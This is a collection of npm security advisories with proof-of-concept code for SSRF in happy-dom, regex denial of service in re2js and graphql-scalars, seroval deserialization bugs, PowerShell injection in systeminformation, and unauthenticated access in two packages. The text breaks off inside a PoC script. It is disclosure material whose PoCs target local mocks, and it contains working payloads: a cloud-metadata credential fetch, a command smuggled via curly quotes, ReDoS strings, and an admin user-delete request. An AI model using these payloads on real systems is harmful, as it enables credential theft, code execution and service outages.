### GHSA-c8p4-j97h-3vg8 — Happy DOM: SSRF via iframe and link stylesheet when parsing untrusted HTML
- Aliases: CVE-2026-118660 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-918
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`
- Affected npm/happy-dom: introduced:0 fixed:21.0.0

## Summary
happy-dom v20.8.9 makes real server-side HTTP requests to arbitrary URLs when parsing HTML containing `<iframe>` or `<link rel="stylesheet">` elements. This behavior is enabled by default (`disableIframePageLoading: false`, `disableCSSFileLoading: false`). When an application uses happy-dom to parse untrusted HTML on the server side, an attacker can trigger Server-Side Request Forgery by embedding these elements.

## Affected Versions
- happy-dom <= 20.8.9 (latest)

## Vulnerable Behavior

By default, happy-dom has:
- `disableIframePageLoading: false` — iframes fetch their `src` URL via real HTTP requests
- `disableCSSFileLoading: false` — `<link>` stylesheets fetch their `href` URL via real HTTP requests

When untrusted HTML is parsed, these elements trigger real server-side HTTP requests to whatever URLs are specified. No special configuration or opt-in is needed.

## Proof of Concept

### Verified test (attacker server receives requests):
```javascript
const http = require('http');
const { Window } = require('happy-dom');

// Start attacker server
const srv = http.createServer((req, res) => {
    console.log(`SSRF HIT: ${req.method} ${req.url}`);
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end('<html><body>stolen</body></html>');
});

srv.listen(9995, () => {
    // iframe SSRF — happy-dom makes a real GET request
    const win1 = new Window({ url: 'http://localhost' });
    win1.document.write('<html><body><iframe src="http://127.0.0.1:9995/iframe-ssrf"></iframe></body></html>');

    // stylesheet SSRF — happy-dom makes a real GET request
    const win2 = new Window({ url: 'http://localhost' });
    win2.document.write('<html><head><link rel="stylesheet" href="http://127.0.0.1:9995/stylesheet-ssrf"></head><body></body></html>');
});
```

**Test output:**
```
SSRF HIT: GET /iframe-ssrf
SSRF HIT: GET /stylesheet-ssrf
```

Both requests confirmed received by the attacker server. Tested on happy-dom v20.8.9, Node.js v22.17.0, macOS.

### Cloud metadata attack scenario:
```javascript
const { Window } = require('happy-dom');
const win = new Window({ url: 'http://localhost' });

// Attacker-controlled HTML triggers fetch to AWS metadata endpoint
win.document.write('<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe></body></html>');
```

## Impact
- **Cloud credential theft** — `<iframe src="http://169.254.169.254/...">` fetches AWS/GCP/Azure metadata
- **Internal network scanning** — probe internal services and ports
- **Data exfiltration** — read responses from internal APIs
- **Affects any server-side use case** — web scraping, email HTML rendering, SSR, testing with external HTML input

## Suggested Fix
Change defaults to disable external resource loading:
```javascript
disableIframePageLoading: true,  // change from false
disableCSSFileLoading: true,     // change from false
```

Or add URL validation to block private IP ranges and cloud metadata endpoints before fetching.

References:
- https://github.com/capricorn86/happy-dom/security/advisories/GHSA-c8p4-j97h-3vg8 [WEB]
- https://github.com/capricorn86/happy-dom/pull/2502 [WEB]
- https://github.com/capricorn86/happy-dom/commit/0a99c7525a1d0043e3182843ae33466ab7b19e74 [WEB]
- https://github.com/capricorn86/happy-dom [PACKAGE]
- https://github.com/capricorn86/happy-dom/releases/tag/v21.0.0 [WEB]

### GHSA-gg6h-894w-4m9c — RE2JS: Quadratic-time denial of service in re2js lookbehind matching
- Aliases: CVE-2026-116795 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-1333, CWE-407
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/re2js: introduced:2.2.0 fixed:2.8.7

### Summary

Using the opt-in `LOOKBEHINDS` flag together with any repeated-matching API
(`matcher().find()` in a loop, `matchAll()`, `split()`, `matcher().replaceAll()`)
causes quadratic-time (Θ(n²)) matching, contradicting the library's own
"linear time matching" guarantee. A single call with a 16,000-character input
takes **36.7–38.7 seconds of CPU**.

### Description

#### Root cause

In `build/index.cjs`, `Machine.match`:

```js
let currentPos = this.prog.numLb > 0 ? 0 : pos;   // ~line 1907
...
if (this.ncap === 0 && this.matched) break;        // ~line 1953
```

Any pattern containing a lookbehind sets `prog.numLb > 0`, which forces the
scan to **always restart at offset 0**, regardless of the requested start
position — the lookbehind automaton is re-seeded and the whole input is
re-walked on every single `find()` call. The early-exit optimization that
would otherwise stop at the first match only fires when `ncap === 0`, but
every `Matcher`-based API (`find`/`matchAll`/`split`/`replaceAll`) always
requests `ncap = 2` (one capture group slot) **even for a captureless
lookbehind pattern** — so the early exit never triggers through those APIs,
and the scan continues to the end of the input on every find.

A find-loop over *k* matches in an *n*-character string therefore costs
*k* × Θ(*n*); for dense matches *k* ∝ *n*, giving **Θ(n²)** total.

#### Isolating control

Identical find-loop, identical input sizes, same 2-character literal pattern
*shape* — but **without** the `LOOKBEHINDS` flag:

| n | with `LOOKBEHINDS` (lookbehind pattern) | without (plain literal) | native JS `RegExp` lookbehind |
|---|---|---|---|
| 2,000 | 204–228 ms | 3 ms | 0 ms |
| 4,000 | 877–899 ms | 4 ms | 0 ms |
| 8,000 | 5,746–6,599 ms | 7 ms | 1 ms |
| 16,000 | 36,667–38,732 ms | 6 ms | 1 ms |

This isolates the lookbehind machinery itself — not pattern length, not
match density in the abstract — as the exact and sole cause.

#### Impact

- `re2js`'s entire value proposition is being an RE2-style engine with
  **linear-time, no-backtracking** matching, specifically to resist
  algorithmic-complexity attacks that plague backtracking regex engines.
  This finding defeats that guarantee for any consumer using the advertised
  `LOOKBEHINDS` feature.
- Realistic affected code paths: log/text processing that tokenizes or
  redacts using a lookbehind-based pattern (`matchAll`, `split`,
  `replaceAll` are the natural APIs for exactly this), applied to
  attacker-influenced text (user input, uploaded logs, scraped content).
- A single ~16–32 KB request pins a CPU core for tens of seconds to minutes;
  Node.js being single-threaded, this freezes the whole worker process for
  the duration. No authentication or special pattern knowledge is required
  from the attacker — ordinary alternating text (`"abababab..."`) triggers it.

#### Reproduction (copy-paste runnable)

create file poc.js

```js
'use strict';
// PoC: quadratic-time DoS in re2js's lookbehind matching (opt-in LOOKBEHINDS flag).
// Usage:
//   npm pack re2js@2.8.6 --ignore-scripts && tar -xzf re2js-2.8.6.tgz
//   node poc.js ./package
const path = require('path');
const pkgDir = process.argv[2] || './package';
const { RE2JS } = require(path.resolve(pkgDir, 'build/index.cjs'));

const re = RE2JS.compile('(?<=a)b', RE2JS.LOOKBEHINDS);

function timeFindLoop(n) {
  const s = 'ab'.repeat(n / 2);
  const t0 = Date.now();
  const m = re.matcher(s);
  let count = 0;
  while (m.find()) count++;
  return { ms: Date.now() - t0, count };
}

console.log('n, matches, ms');
const sizes = [2000, 4000, 8000, 16000];
const results = [];
for (const n of sizes) {
  const r = timeFindLoop(n);
  results.push(r.ms);
  console.log(`${n}, ${r.count}, ${r.ms}`);
}

const ratio = results[results.length - 1] / results[results.length - 2];
console.log('');
console.log('time ratio for the last doubling of n:', ratio.toFixed(2), '(~2 => linear, ~4 => quadratic)');
console.log(ratio > 3 ? 'PASS  quadratic scaling confirmed on the REAL published package' : 'FAIL  scaling looks linear');
process.exit(ratio > 3 ? 0 : 1);
```

and run in terminal

```sh
npm pack re2js@2.8.6 --ignore-scripts
tar -xzf re2js-2.8.6.tgz
node poc.js ./package
```

`poc.js` times a `matcher(s).find()` loop over `(?<=a)b` +
`RE2JS.LOOKBEHINDS` on inputs of 2,000/4,000/8,000/16,000 chars and reports
the doubling ratio. Expected: clearly superlinear (ratio ≫ 2, approaching or
exceeding the 4× quadratic signature), reaching tens of seconds at 16,000
chars. Run twice; results are deterministic.

References:
- https://github.com/le0pard/re2js/security/advisories/GHSA-gg6h-894w-4m9c [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-116795 [ADVISORY]
- https://github.com/le0pard/re2js/pull/59 [WEB]

### GHSA-x8rm-f576-gq67 — graphql-scalars PhoneNumber scalar is vulnerable to regular expression denial of service
- Aliases: CVE-2026-115887 | Published: 2026-10-28 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-1333
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/graphql-scalars: introduced:1.24.1 fixed:2.0.1

## Summary

The regular expression behind `GraphQLPhoneNumber` since 1.24.1 backtracks exponentially. A string made of a run of digits followed by one character that makes the match fail (for example `"1".repeat(30) + "x"`) blocks the JavaScript thread for seconds, and every additional digit doubles the time.

graphql-js calls `parseLiteral` while *validating* a document and `parseValue` while coercing variables, so the regex runs for every request that merely contains such a value in a `PhoneNumber` position, before execution and before any authentication or authorization step of the server. One small unauthenticated request is enough to stall a server process.

## Affected versions

- `graphql-scalars` >= 1.24.1, <= 2.0.0 (2.0.0 is the current `latest`; the default branch still has the same pattern).
- Not affected: 1.24.0 and the earlier versions I checked (1.22.4, 1.23.0), which use the linear `/^\+[1-9]\d{6,14}$/`.
- Introduced by #2719 (c7f58da16, "PhoneNumber scalar is not fully compatible with E.164 format so updated regex to support phone number with extension"), released as 1.24.1 on 2025-01-29.

The payload was ran against 1.22.4, 1.23.0, 1.24.0, 1.24.1, 1.24.2, 1.25.0, 1.26.0 and 2.0.0: the first three reject it instantly, the other five show the exponential growth.

## Root cause

`src/scalars/PhoneNumber.ts`:

```js
const PHONE_NUMBER_REGEX = /^\+?\d{1,3}(\-|\x20)?\(?\d+\)?((\-|\x20)?\d+)+$/;
```

In `\d+\)?((\-|\x20)?\d+)+$` the separator is optional, so a run of n digits can be split across the inner `\d+` and the outer `+` iterations in a number of ways that is exponential in n. When the overall match fails, for instance on a trailing non-digit, the engine tries all of them.

## Proof of concept

1. The scalar alone (`npm i graphql graphql-scalars@2.0.0`):

```js
import { GraphQLPhoneNumber } from 'graphql-scalars';

for (const ok of ['+41791234567', '079 123 45 67', '+1 (123) 456-7890', 'nope']) {
  try { GraphQLPhoneNumber.parseValue(ok); } catch {}
}
for (const digits of [24, 26, 28, 30]) {
  const start = performance.now();
  try { GraphQLPhoneNumber.parseValue('1'.repeat(digits) + 'x'); } catch {}
  console.log(`${digits} digits: ${((performance.now() - start) / 1000).toFixed(2)} s`);
}
```

Measured warm, i.e. after ordinary inputs have been validated like in a running server:

| digits | Node 22.19.0 | Node 26.10.0 |
|-------:|-------------:|-------------:|
| 24 | 0.10 s | 0.07 s |
| 26 | 0.41 s | 0.29 s |
| 28 | 1.63 s | 1.14 s |
| 30 | 6.59 s | 4.62 s |

The time doubles with every digit. The first execution of the regex in a fresh process is about 5x slower because V8 interprets a regexp on its first run (Node 22.19.0, 28 digits: 7.8 s).

2. Through graphql-js, no server and no authentication: a schema with a single `echo(phone: PhoneNumber)` field, 26 digits + `x`, Node 22.19.0, warm:

| | literal (`parseLiteral`, validation) | variable (`parseValue`, coercion) |
|---|---:|---:|
| graphql 16.14.2 | 0.41 s | 0.43 s |
| graphql 17.0.2 | 0.41 s | 0.83 s (evaluated twice) |

3. Also reproduced end to end against a GraphQL Yoga server: an anonymous HTTP request with a 27-digit value plus one invalid character stalled the whole process (a concurrent trivial `{ __typename }` request waited as long). A mutation that requires authentication was affected equally when called anonymously, because document validation runs before any authorization in resolvers or context.

## Impact

Denial of service. Any GraphQL server that exposes `PhoneNumber` on an argument, an input object field or a variable can be stalled by a request of about 30 characters; roughly 40 characters would keep a process busy for hours (extrapolated from the doubling, not measured). `serialize` uses the same regex, so unvalidated stored values returned through a `PhoneNumber` field are affected too. The actual severity depends on the scalar being applied to untrusted input, which is the typical case.

## Suggested fix

An equivalent pattern without ambiguous splits:

```js
const PHONE_NUMBER_REGEX = /^\+?\d{1,3}[- ]?\(?\d(?:\d*\))?(?:[- ]?\d)+$/;
```

It accepts exactly the same strings as the current one, so there is no behaviour change: with `N = (S?\d+)+ = (S?\d)+` a digit run is just repeated single-digit iterations, hence `\d+\)?N = \d(\d*\))?N`. Verification:

- exhaustive comparison of old and new pattern on every string up to length 9 over `1 + - space ( ) x`: 47,079,208 strings (1,832 accepted), 0 differences;
- every sequence of up to 6 tokens from `1 11 111 1111 11111 + - space ( ) x`: 1,948,717 strings (100,380 accepted), 0 differences;
- adversarial inputs (digit runs plus a failing character, digit/space and digit/dash alternations, parenthesis variants) scale linearly: 1,000,000 characters take about 10 ms, where the current pattern needs 0.3 s for 26.

Optionally also reject values above a sane length before matching; the grammar currently has no upper bound and E.164 allows at most 15 digits. Above roughly 10 million characters V8 aborts the match with a `RangeError` (stack) after about 25 ms instead of returning false.

A regression test that fails with the current implementation: `GraphQLPhoneNumber.parseValue('1'.repeat(40) + 'x')` must throw its validation error immediately; with the current pattern it does not return in any reasonable time.

## Workarounds for users until a fix is released

- Replace the scalar in the schema with one that uses the pattern above.
- Run Node with `--enable-experimental-regexp-engine-on-excessive-backtracks`, or call `v8.setFlagsFromString('--enable-experimental-regexp-engine-on-excessive-backtracks')` before the regex first runs. V8 then falls back to its linear-time engine after excessive backtracking; verified on Node 22.19, 24.15 and 26.10. The flag is not accepted in `NODE_OPTIONS`.
- Pinning `graphql-scalars` to <= 1.24.0 restores a linear pattern but changes which values are accepted (only `+` prefixed E.164).

## Coordination

We have not disclosed this publicly. We maintain Unchained Engine (`@unchainedshop/api`), a downstream project that exposes this scalar on public input fields and will need to ship a mitigation of its own, so we would like to coordinate the timing of any public disclosure with you. Please let us know your preferred timeline, and whether you would like us to prepare a pull request (we can work in a temporary private fork if you enable one).

References:

- https://github.com/graphql-hive/graphql-scalars/pull/2719 [WEB]

- https://github.com/graphql-hive/graphql-scalars [PACKAGE]
- https://github.com/graphql-hive/graphql-scalars/releases/tag/v2.0.1 [WEB]

### GHSA-7rv5-mrxv-xcr9 — Seroval: Deserialization invokes attacker-chosen callables: AsyncIteratorFactoryInstance calls source.on(listener) without type check
- Aliases: CVE-2026-116580 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-502
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`
- Affected npm/seroval: introduced:0 fixed:1.6.8

### Summary

When `fromJSON` rebuilt an async iterator, it called `on()` on the iterator's source without checking that the source was a seroval stream. A crafted payload could pick another value as the source, such as a function returned by an application plugin. The deserializer then called that value's `on` method.

This is a variant of GHSA-mv8w-475r-vwqw. That fix covered the promise and stream control nodes but not the async iterator node.

### Impact

An application that passes untrusted input to `fromJSON` with plugins that return callable values can have those callables invoked during deserialization. What this allows depends on what the plugin's values do.

### Affected versions

- Versions up to 1.6.3 accept any value as the source.
- 1.6.4 rejects the reported payload.
- 1.6.5 to 1.6.7 check the source by node type, which a payload can get around by reusing a node id.
- All versions up to 1.6.7 should be treated as affected.

### Patches

Fixed in `seroval@1.6.8`. Streams and sequences are now internal class instances. The deserializer checks the source value with `instanceof`, so plain data and plugin values are rejected no matter which node id they use.

### Workarounds

Avoid plugins whose `deserialize` returns functions or objects with an `on` method when decoding untrusted input. Upgrading to 1.6.8 is recommended.

### GHSA-wp97-x4hv-qvhp — Seroval `fromJSON`/`fromCrossJSON` denial of service via unvalidated array node length
- Aliases: CVE-2026-116584 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-770
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/seroval: introduced:1.4.1 fixed:1.6.8

### Summary

`fromJSON` and `fromCrossJSON` did not check that an array node's element list is an array. A small crafted payload could set the length the decoder used. That length controlled how much memory was allocated and how many times the decoder looped, and it did not depend on the size of the payload.

### Impact

A service that passes untrusted input to `fromJSON` or `fromCrossJSON` can be made unavailable by an unauthenticated request.

- A small payload can allocate enough memory to end the process.
- A small payload can block the thread for seconds, or without end.

This affects any framework that decodes request bodies with these functions before its own validation runs.

This issue is a bypass of the fix for GHSA-66fc-rw6m-c2q6 in 1.4.1.

### Patches

Fixed in `seroval@1.6.8`. The deserializer now rejects any node whose element list is not an array, and throws `SerovalMalformedNodeError`.

### Workarounds

None. Upgrade to 1.6.8.

### GHSA-97r2-qh9m-474h — Seroval: fromJSON deserializer trusts node-supplied array length and sequence doneAt (unauthenticated event-loop DoS)
- Aliases: CVE-2026-116581 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-1284, CWE-835
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/seroval: introduced:0 fixed:1.6.8

### Summary

`fromJSON` and `fromCrossJSON` used two node fields without checking them.

- An array node's element list was not checked to be an array. A small payload could set the length the decoder looped over. This part is also tracked in GHSA-wp97-x4hv-qvhp.
- A sequence node's done index was not checked. A crafted value produced an iterator that never finished.

### Impact

A service that passes untrusted input to `fromJSON` or `fromCrossJSON` can be made unavailable by an unauthenticated request.

- The array case blocks the thread while the decoder runs.
- The sequence case makes any code that reads the resulting iterator to the end run forever.

### Patches

Fixed in `seroval@1.6.8`.

- Element lists must be arrays.
- A sequence node's throw and done indices must be integers from -1 up to the last element index.

Invalid input throws `SerovalMalformedNodeError`.

### Workarounds

None. Upgrade to 1.6.8.

### GHSA-3f7j-7jwc-fxfj — systeminformation vulnerable to Windows command injection in services() through Unicode quotation marks
- Aliases: CVE-2026-116576 | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-78
- CVSS_V3: `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- Affected npm/systeminformation: introduced:0 fixed:5.33.16

### Summary

On Windows, `systeminformation@5.33.15` builds a PowerShell command using the value passed to `services()`. The default sanitizer removes ASCII quotes but keeps Unicode curly quotes, spaces, and parentheses. A crafted service name can use those characters to break out of the generated filter string and run a PowerShell expression. The expression runs with the permissions of the Node.js process.

This report confirms version `5.33.15`. Other package versions have not been checked.

### Details

In `lib/processes.js`, `services()` sanitizes the caller's string with `sanitizeShellString()` and later inserts each resulting name into a `Get-CimInstance Win32_Service -Filter` command. The Windows branch passes that command to `util.powerShell()`.

The sanitizer in `lib/util.js` removes the ASCII double quote, but it does not remove U+201C or U+201D, the left and right curly double quotation marks. It also permits spaces and parentheses when called in its default, non-strict mode. PowerShell accepts the curly marks as string delimiters, so an input can end the filter string and place a command expression in the generated command.

For example, the input below uses curly quotation marks to end the generated filter string and execute `New-Item`. I reproduced this call on Windows against the checked-out `systeminformation@5.33.15` source; it created a marker file with the Node.js process account.

### Proof of concept

Run this on Windows in a disposable directory with Node.js and PowerShell available:

```powershell
mkdir si-command-injection-repro
cd si-command-injection-repro
npm init -y
npm install systeminformation@5.33.15
```

Save the following as `poc.cjs`, then run `node poc.cjs`:

```js
'use strict';

const fs = require('node:fs');
const path = require('node:path');
const si = require('systeminformation');

(async () => {
  const markerName = `si-injection-${process.pid}.txt`;
  const markerPath = path.join(process.cwd(), markerName);
  fs.rmSync(markerPath, { force: true });

  try {
    await si.services(`not-a-service” (New-Item -Name ${markerName} -ItemType File -Force) “`);
    console.log(`markerCreated=${fs.existsSync(markerPath)}`);
  } finally {
    fs.rmSync(markerPath, { force: true });
  }
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Expected output:

```text
markerCreated=true
```

The Windows run returned an array and created the marker (`markerCreated: true`). A benign input left the marker absent. The script removes the marker afterward. I did not identify an application network route that forwards remote input to `services()`, so remote exploitability depends on the consuming application.

### Impact

An application that passes attacker-controlled input to `services()` on Windows can execute PowerShell commands with the Node.js process account's permissions. Depending on that account, commands may read or change accessible files, alter application data, or disrupt the service. I searched this repository for HTTP servers, route handlers, and listener calls and found none. `services()` is exposed through the package API and `getDynamicData()`, so a consuming application could make the input network-reachable if it forwards request data. A separate loopback HTTP harness did trigger the command through a query parameter, but that server was test code and is not part of this repository. The project's `docs/security.html` already warns that arbitrary untrusted input to `services()` needs caution because package sanitization does not cover every case.

### GHSA-q344-5v34-gm84 — @sylphx/pdf-reader-mcp: HTTP transport accepts unauthenticated requests despite a configured MCP_API_KEY
- Aliases: CVE-2026-62264 | Published: 2026-10-29 | Modified: 2026-10-29 | Severity: HIGH
- CWE: CWE-200, CWE-287, CWE-306
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- Affected npm/@sylphx/pdf-reader-mcp: introduced:2.2.0 fixed:3.0.1

### Impact

When `@sylphx/pdf-reader-mcp` is run as an HTTP server (`MCP_TRANSPORT=http`), it reads the `MCP_API_KEY` environment variable and logs `API key authentication enabled (X-API-Key header)` at startup, but it never validated the `X-API-Key` header on incoming requests. The key was read into a variable and never enforced on the request path.

As a result, the `/mcp` endpoint accepted **unauthenticated** requests. Combined with the default bind address of `0.0.0.0` (all interfaces), any client able to reach the port could invoke every PDF tool and read the contents of any PDF the server process could open anywhere on the host. URL-based sources also enable limited SSRF (private/loopback addresses are blocked by default unless `--allow-private-ips` is set).

The misleading startup log made the exposure silent: an operator who set `MCP_API_KEY` reasonably believed the server was protected when it was not.

This affects only the opt-in HTTP transport; the default `stdio` transport is unaffected.

### Patches

Fixed in `@sylphx/pdf-reader-mcp@3.0.1`. The fix enforces the `X-API-Key` header with a constant-time comparison (rejecting missing/mismatched keys with HTTP 401), changes the default bind host to `127.0.0.1` (loopback), and emits a startup warning when binding a non-loopback host without an API key.

### Workarounds

For deployments that cannot upgrade immediately:

- Bind to loopback only: `MCP_HTTP_HOST=127.0.0.1`.
- Place a reverse proxy in front that enforces authentication.
- Use the default `stdio` transport instead of HTTP.
- Restrict filesystem reach with `--allow-dir` / `MCP_PDF_ALLOWED_DIRS`.

Reported privately by **novice-22** via responsible disclosure.

References:

### GHSA-w9x9-j56r-h98r — @eeacms/volto-chatbot has Unauthenticated Danswer API Confused Deputy Proxy
- Aliases:  | Published: 2026-10-29 | Modified: 2026-10-29 | Severity: HIGH
- CWE: CWE-862
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- Affected npm/@eeacms/volto-chatbot: introduced:0 fixed:2.0.4

## Unauthenticated Danswer API Confused Deputy Proxy in @eeacms/volto-chatbot

### Summary

`@eeacms/volto-chatbot` exposes an Express middleware route (`**/_v1_da/**`) that accepts unauthenticated HTTP requests from any network client and proxies them to the configured upstream Danswer API, automatically attaching the server-side service credentials (`DANSWER_API_KEY` or session cookie). Because no authorization check, path allowlist, or method restriction is applied before the upstream request is issued, an unauthenticated attacker can invoke arbitrary Danswer API operations — including privileged admin endpoints — as the configured service account. This is a classic Confused Deputy attack: the Volto proxy acts as a deputy that carries credentials on behalf of the attacker.

### Details

The vulnerability is introduced across two source files in `@eeacms/volto-chatbot@2.0.3`.

**Route registration (`src/index.js:15`):**

```js
middleware.all('**/_v1_da/**', proxyMiddleware);
```

The wildcard pattern matches every HTTP method and any sub-path, and no authentication middleware is chained before `proxyMiddleware`. This means all requests reaching any `/_v1_da/` path are forwarded without any identity check.

**Unvalidated path extraction and upstream URL construction (`src/middleware.js:228-230`):**

```js
const path = req.url.replace('/_v1_da/', '/');
const reqUrl = `${process.env.DANSWER_URL || ''}/api${path}`;
```

The attacker-controlled `req.url` is transformed into the upstream Danswer path with a simple string replace. There is no allowlist of permitted paths, no restriction on HTTP methods, and no validation of the resulting URL. The attacker therefore fully controls which Danswer endpoint is called and with which HTTP method.

**Credential attachment and forwarding (`src/middleware.js:164`, `src/middleware.js:169`, `src/middleware.js:202`):**

```js
// Session-cookie path (line 164):
headers = { Cookie: cached_auth_cookie, ... }

// API-key path (line 169):
Authorization: 'Bearer ' + api_key,

// Sink — final upstream dispatch (line 202):
const response = await fetch(url, options, req.body);
```

After constructing the URL from attacker-supplied input, the middleware attaches the server-side Danswer credentials (either a cached login session cookie or a `Bearer` API key) and dispatches the request. The response from Danswer is then relayed back to the unauthenticated client.

**Complete data flow (source → sink):**

1. `src/index.js:15` — all `**/_v1_da/**` paths registered to `proxyMiddleware` with no auth guard (source: external HTTP request).
2. `src/middleware.js:228` — `req.url` used directly to derive the upstream path without allowlist.
3. `src/middleware.js:230` — attacker-controlled path appended to `${DANSWER_URL}/api`.
4. `src/middleware.js:164` / `src/middleware.js:169` — server-side session cookie or API key attached.
5. `src/middleware.js:202` — `fetch(url, options, req.body)` sends the fully-credentialed request to the Danswer backend (sink).

This vulnerability is present whenever the add-on middleware is installed and `DANSWER_API_KEY` or `DANSWER_USERNAME`/`DANSWER_PASSWORD` is configured — conditions required for normal, documented operation of the package.

### PoC

The following steps reproduce the vulnerability using the Docker-based test harness provided with this report.

**Prerequisites:**
- Docker installed
- Python 3 with the `requests` library

**Step 1 — Build the Docker image (from the `npmAI_719_eea__volto-chatbot/` parent directory):**

```bash
docker build \
  -f vuln-001/Dockerfile \
  -t vuln001-proxy \
  reports/npmAI_719_eea__volto-chatbot
```

The image packages the unmodified `src/middleware.js` from `@eeacms/volto-chatbot@2.0.3`, a minimal Express server that wires the vulnerable middleware, and an in-container mock Danswer server that echoes every received request as JSON. The environment variable `DANSWER_API_KEY=supersecret` is set to simulate a real deployment.

**Step 2 — Start the container:**

```bash
docker run --rm -d -p 3000:3000 --name vuln001-test vuln001-proxy
```

This launches both the Volto proxy (port 3000) and the mock Danswer server (port 18080) inside the container.

**Step 3 — Run the PoC exploit script:**

```bash
python3 vuln-001/poc.py 127.0.0.1 3000
```

**What the script does:**
1. Waits for the proxy to accept TCP connections.
2. Sends an unauthenticated `POST` request with a JSON body to the admin-only Danswer endpoint via the proxy:

```
POST http://127.0.0.1:3000/_v1_da/admin/users/delete
Content-Type: application/json

{"id": "victim-user-123"}
```

No `Authorization` or `Cookie` header is sent by the client.

**Expected output (exploit confirmed):**

```
[+] === EXPLOIT CONFIRMED — PASS ===
[+] Decisive evidence:
    1. Attacker-controlled path reached upstream : url='/api/admin/users/delete'
    2. Server-side API key forwarded (no client auth) : authorization='Bearer supersecret'
    3. Attacker-controlled HTTP method forwarded : method='POST'
```

The mock Danswer server receives `POST /api/admin/users/delete` with `Authorization: Bearer supersecret` — proving that the attacker controlled both the upstream path and the HTTP method while the server silently attached its own credentials.

**Equivalent manual curl command (without Docker):**

```bash
# Terminal 1 — mock Danswer server
node - <<'NODE'
require('http').createServer((req, res) => {
  let b = ''; req.on('data', c => b += c);
  req.on('end', () => {
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({
      method: req.method, url: req.url,
      authorization: req.headers.authorization || null,
      body: b
    }));
  });
}).listen(18080, () => console.log('mock Danswer on :18080'));
NODE

# Terminal 2 — Volto with Danswer credentials configured
DANSWER_URL=http://127.0.0.1:18080 DANSWER_API_KEY=secret yarn start

# Terminal 3 — unauthenticated exploit request
curl -i -X POST 'http://localhost:3000/_v1_da/admin/users/delete' \
  -H 'Content-Type: application/json' \
  --data '{"id":"victim-user-123"}'
```

The response body will contain `"authorization":"Bearer secret"` and `"url":"/api/admin/users/delete"`, confirming the Confused Deputy.

### Impact

This is a **Confused Deputy / Missing Authorization** vulnerability. The Volto proxy acts as a privileged deputy that forwards attacker-supplied requests to the Danswer backend while silently attaching its own service credentials.

**Who is impacted:**

Any deployment of `@eeacms/volto-chatbot` that:
- has the package's Express middleware installed (default when the add-on is active), AND
- has `DANSWER_API_KEY` or `DANSWER_USERNAME`/`DANSWER_PASSWORD` configured (required for the add-on to function at all).

Because these conditions are satisfied in every normal production deployment of the package, the vulnerability is effectively default-on.

**Concrete attacker capabilities depend on the Danswer service account's permissions but include:**

- **High Confidentiality impact** — reading any Danswer endpoint accessible to the service account, including documents, user data, conversation history, and configuration.
- **Low–High Integrity impact** — invoking write/mutate endpoints such as `POST /admin/users/delete`, `POST /chat/create-chat-session`, or any other writable Danswer API path as the service account.
- **No Authentication required** — the attacker needs only network access to the Volto server (port 3000); no user account, cookie, or token is required.

The vulnerability is exploitable by any unauthenticated network attacker, including anonymous internet users if the Volto server is publicly reachable.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# Dockerfile for VULN-001 PoC — Unauthenticated Danswer API Confused Deputy Proxy
#
# Build context: the parent directory (npmAI_719_eea__volto-chatbot/)
#   docker build -f vuln-001/Dockerfile -t vuln001-proxy .
#
# Run:
#   docker run --rm -p 3000:3000 vuln001-proxy

FROM node:18-alpine

WORKDIR /app

# Install production dependencies required by the vulnerable middleware and test harness
RUN npm init -y && npm install --save \
    express@4 \
    superagent@8 \
    node-fetch@2 \
    debug@4 \
    @babel/core@7 \
    @babel/register@7 \
    @babel/preset-env@7

# Copy the vulnerable middleware source (unmodified from repo)
COPY repo/src/middleware.js /app/src/middleware.js

# Copy the test harness
COPY vuln-001/test_server.js /app/test_server.js

# Point the proxy at the in-container mock Danswer server.
# DANSWER_API_KEY is the secret the server attaches to every upstream request.
ENV DANSWER_URL=http://127.0.0.1:18080
ENV DANSWER_API_KEY=supersecret

EXPOSE 3000

CMD ["node", "test_server.js"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
Proof-of-Concept: VULN-001
Title:  Unauthenticated Danswer API Confused Deputy Proxy
CWE:    CWE-862 — Missing Authorization
CVSS:   8.2 (High)  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N

Vulnerability:
    src/index.js:15 registers  middleware.all('**/_v1_da/**', proxyMiddleware)
    with NO authentication guard.  src/middleware.js:228-230 derives the
    upstream Danswer API path directly from req.url without any allowlist,
    then attaches the server-side DANSWER_API_KEY (or session cookie) before
    calling fetch().  An unauthenticated attacker therefore controls:
        - the upstream Danswer API path   (e.g. /admin/users/delete)
        - the HTTP method                 (POST, DELETE, …)
        - the request body
    while the server silently adds its own credentials.

Exploit flow:
    Attacker --(unauthenticated POST /_v1_da/admin/users/delete)--> Volto proxy
    Volto proxy --(POST /api/admin/users/delete  Authorization: Bearer <key>)--> Danswer

Usage:
